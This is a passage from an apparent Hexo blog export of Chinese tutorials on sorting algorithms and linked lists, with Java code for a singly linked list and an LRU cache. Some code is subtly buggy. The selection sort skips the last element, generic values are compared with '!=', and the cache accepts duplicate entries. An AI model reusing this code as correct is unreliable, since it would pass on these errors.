src=\"/posts/2018-09-20-算法-排序(上)/选择排序过程.jpg\">\n<p>同样，也有三个问题需要你思考。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。</p>\n<p><strong>第二、插入排序的时间复杂度是多少？</strong></p>\n<p>选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。</p>\n<p><strong>第三、插入排序是稳定的排序算法吗？</strong></p>\n<p>答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。</p>\n<p>比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i+<span class=\"number\">1</span>; j&lt;n-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        \t<span class=\"keyword\">if</span>(a[j]&lt;a[i])&#123;</span><br><span class=\"line\">        \t\t<span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">        \t\ta[j] = a[i];</span><br><span class=\"line\">        \t\ta[i] = temp;</span><br><span class=\"line\">        \t&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？</p>\n<p>我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。</p>\n<p>但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序中的数据交换操作</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">    a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">    flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插入排序中数据移动操作</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。</p>\n<p>所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>是否原地排序</th>\n<th>是否稳定</th>\n<th>最好</th>\n<th>最坏</th>\n<th>平均</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>√</td>\n<td>×</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n</tbody>\n</table>\n<p>这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。</p>\n<p>今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-链表","date":"2018-09-11T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。\n\n缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。\n\n缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。\n\n今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表及其结构\n{% endnote %}\n</div>\n\n相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。\n\n我们先从**底层存储结构**来看一下二者的区别：\n\n为了直观的对比，我画了一张图，从图中可以看到，**数组需要一块连续的内存空间来存储**，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。\n\n而链表恰恰相反，它并不需要一块连续的内存空间，他**通过“指针”将一组零散的内存块连接起来**使用，所以申请一块大小是100MB的链表，根本不会有问题。\n\n{% asset_img 数组与链表结构对比.jpg 数组与链表结构对比 %}\n\n链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。\n\n#### 单链表\n\n首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“**结点**”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做**后继指针 next**。\n\n{% asset_img 单链表.jpg %}\n\n从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为**头结点**，最后一个节点称为**尾结点**。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。\n\n与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。\n\n为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。\n\n{% asset_img 单链表插入删除.jpg %}\n\n但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。\n\n你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。\n\n好了，单链表了解了，下面来看看另外两个复杂的链表：**循环链表和双向链表**。\n\n#### 循环链表\n\n**循环链表是一种特殊的单链表**。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。\n\n{% asset_img 循环链表.jpg %}\n\n和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。\n\n#### 双线链表\n\n接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：**双向链表**。\n\n单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。\n\n{% asset_img 双向链表.jpg %}\n\n从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？\n\n从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。\n\n你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。\n\n我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：\n* 删除结点中“值等于某个给定值的”结点\n* 删除给定指针指向的结点\n\n对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。\n\n尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。\n\n对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p->next = q，说明p是q的前驱结点。\n\n但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！\n\n同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。\n\n除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。\n\n现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。\n\n实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。\n\n还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。\n\n所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？\n\n了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：**双向循环链表**。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？\n\n{% asset_img 双向循环链表.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表 VS 数组性能大比拼\n{% endnote %}\n</div>\n\n通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。\n\n|时间复杂度|数组|链表|\n|--------|----|----|\n|插入删除|O(n)|O(1)|\n|随机访问|O(1)|O(n)|\n\n不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。\n\n数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。\n\n数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。\n\n你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。\n\n我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。\n\n除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。\n\n所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？\n\n我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。\n\n1. 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。\n\n2. 如果此数据没有缓存在链表中，又可以分为两种情况：\n  - 如果此时缓存未满，则将此结点直接插入到链表的头部；\n  - 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。\n\n这样我们就实现了一个LRU缓存，是不是很简单。\n\n现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。\n\n实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。\n\n基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。\n\n和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<br>\n\n本章代码：[GitHub](https://github.com/AriesRen/algorithm)\n\n带头单链表代码：\n\n```java\nimport java.util.NoSuchElementException;\n\npublic class SinglyLinkedList<T>{\n    private Node<T> head;\n    private int size;\n\n    public SinglyLinkedList(){\n        this.head = new Node<>(null);\n    }\n\n    // 链表头部插入值\n    private void linkFirst(Node<T> newNode){\n        newNode.next = head.next;\n        head.next = newNode;\n        size++;\n    }\n    // 链表尾部插入值\n    public void linkLast(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    private void linkLast(Node<T> newNode){\n        Node<T> p = head;\n        while (p.next!=null){\n            p=p.next;\n        }\n        p.next = newNode;\n        size++;\n    }\n    // 获取头部值\n    public T getFirst(){\n        if (head.next == null){\n            throw new NoSuchElementException();\n        }\n        return head.next.val;\n    }\n    // 获取尾部值\n    public T getLast(){\n        Node<T> p = head.next;\n        while (p.next!=null){\n            p = p.next;\n        }\n        return p.val;\n    }\n    // 添加\n    public void add(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    // 在某处索引插入\n    public void add(int index, T val){\n        Node<T> newNode = new Node<>(val);\n        Node<T> p = node(index);\n        insert(p, newNode);\n    }\n    private void insert(Node<T> p, Node<T> newNode){\n        Node<T> q = head;\n        while (q!=null && q.next!=p){\n            q = q.next;\n        }\n        if (q == null){\n            return;\n        }\n        newNode.next = p;\n        q.next = newNode;\n    }\n\n    // 根据值删除某个节点\n    public boolean delete(T val){\n        Node<T> p = head;\n        while (p.next !=null && !p.next.val.equals(val)){\n            p = p.next;\n        }\n        if (p.next== null){\n            return false;\n        }\n        p.next = p.next.next;\n        return true;\n    }\n    // 根据索引删除某结点\n    public T delete(int index){\n        Node<T> deleteNode = node(index);\n        return deleteNode(deleteNode);\n    }\n    private T deleteNode(Node<T> deleteNode){\n        final T element = deleteNode.val;\n        Node<T> p = head;\n        while (p.next!= null && p.next != deleteNode){\n            p = p.next;\n        }\n        if (p.next == null){\n            return null;\n        }\n        p.next = deleteNode.next;\n        return element;\n    }\n\n    // 根据索引获取值\n    public T get(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        return node(index).val;\n    }\n\n    // 通过value 查找对应的索引\n    public int indexOf(T val){\n        int index = 0;\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n            index ++;\n        }\n        if (p.next == null){\n            index = -1;\n        }\n        return index;\n    }\n    public boolean contains(T val){\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n        }\n        return p.next != null;\n    }\n\n    private Node<T> node(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        Node<T> p = head.next;\n        int i=0;\n        while (i<size){\n            if (i == index){ break; }\n            p = p.next;\n            ++i;\n        }\n        return p;\n    }\n    public void push(T val){\n        Node<T> newNode = new Node<>(val);\n        linkFirst(newNode);\n    }\n    public T pop(){\n        return unlinkedFirst();\n    }\n\n    private T unlinkedFirst(){\n        Node<T> first = head.next;\n        if (first == null){\n            throw new RuntimeException(\"没有元素\");\n        }\n        return unlinkedFirst(first);\n    }\n    private T unlinkedFirst(Node<T> node){\n        final T element = node.val;\n        head.next = head.next.next;\n        node.next = null;\n        node.val = null;\n        size--;\n        return element;\n    }\n\n    // 单链表反转\n    public void reverse(){\n        // 链表为空或者链表只有一个元素时\n        if (head.next == null || size <=1 ){\n            return;\n        }\n        Node<T> p = head.next;\n        Node<T> q = p.next;\n        Node<T> r;\n        p.next = null;\n        while (q !=null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        head.next = p;\n    }\n\n    public int size(){\n        return size;\n    }\n\n    // 打印链表 example: [1, 2, 3]\n    @Override\n    public String toString() {\n        if (head.next == null){\n            return \"[]\";\n        }\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        Node<T> p = head.next;\n        while (p.next!=null){\n            sb.append(p.val).append(\", \");\n            p = p.next;\n        }\n        sb.append(p.val).append(\"]\");\n        return sb.toString();\n    }\n\n    public static class Node<T>{\n        private T val;\n        private Node<T> next;\n        Node(T val){\n            this.val = val;\n        }\n    }\n}\n```\n\n基于链表的LRU缓存代码：\n```java\npublic interface LRUCache<T> {\n    void put(T val);\n\n    T get(T val);\n\n    int Size();\n}\n\nclass ListLRUCache<T> implements LRUCache<T> {\n    private SinglyLinkedList<T> lruList;\n    private static final int DEFAULT_CAP=10;\n\n    // 缓存容量\n    private int cap;\n    // 缓存使用大小\n    private int size;\n\n    public ListLRUCache(){\n        this(DEFAULT_CAP);\n    }\n    public ListLRUCache(int cap){\n        this.cap = cap;\n        this.lruList = new SinglyLinkedList<>();\n    }\n\n    @Override\n    public void put(T value) {\n        // 1、缓存满了\n        // 如果该列表中没有该数据\n        if (size == cap){\n            // 1、缓存满了\n            // 删除最后一个节点\n            lruList.delete(size-1);\n            // 将该数据插入到链表头部\n            lruList.push(value);\n        }else {\n            // 2、缓存未满\n            // 直接在列表头部插入该数据\n            lruList.push(value);\n            size++;\n        }\n    }\n\n    @Override\n    public T get(T val) {\n        T result = null;\n        if (lruList.contains(val)){\n            // 在list中,从list中获取该数据\n            int index = lruList.indexOf(val);\n            result = lruList.get(index);\n            System.out.println(\"从缓存中获取\");\n            // 将该节点插入到链表头部\n            lruList.delete(index);\n            lruList.push(val);\n        }else{\n            // 如果该列表中没有该数据\n            System.out.println(\"缓存中没有该数据！\");\n            if (size == cap){\n                // 1、缓存满了\n                // 删除最后一个节点\n                lruList.delete(size-1);\n                // 将该数据插入到链表头部\n                lruList.push(val);\n                System.out.println(\"缓存已满！将该数据插入到缓存\");\n            }else {\n                // 2、缓存未满\n                // 直接在列表头部插入该数据\n                lruList.push(val);\n                size++;\n                System.out.println(\"将该数据直接插入到缓存\");\n            }\n            // 如果有数据库，该数据从数据库中获取\n            result = val;\n        }\n\n        return result;\n    }\n\n    public int Size(){\n        return size;\n    }\n}\n```\n\n字符串是否是回文字符串：\n```java\n\n```\n\n<br>","source":"_posts/算法-链表.md","raw":"---\ntitle: 算法-链表\ndate: 2018-09-12 00:18:36\ntags: ['算法','链表']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。\n\n缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。\n\n缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。\n\n今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表及其结构\n{% endnote %}\n</div>\n\n相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。\n\n我们先从**底层存储结构**来看一下二者的区别：\n\n为了直观的对比，我画了一张图，从图中可以看到，**数组需要一块连续的内存空间来存储**，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。\n\n而链表恰恰相反，它并不需要一块连续的内存空间，他**通过“指针”将一组零散的内存块连接起来**使用，所以申请一块大小是100MB的链表，根本不会有问题。\n\n{% asset_img 数组与链表结构对比.jpg 数组与链表结构对比 %}\n\n链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。\n\n#### 单链表\n\n首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“**结点**”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做**后继指针 next**。\n\n{% asset_img 单链表.jpg %}\n\n从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为**头结点**，最后一个节点称为**尾结点**。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。\n\n与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。\n\n为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。\n\n{% asset_img 单链表插入删除.jpg %}\n\n但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。\n\n你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。\n\n好了，单链表了解了，下面来看看另外两个复杂的链表：**循环链表和双向链表**。\n\n#### 循环链表\n\n**循环链表是一种特殊的单链表**。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。\n\n{% asset_img 循环链表.jpg 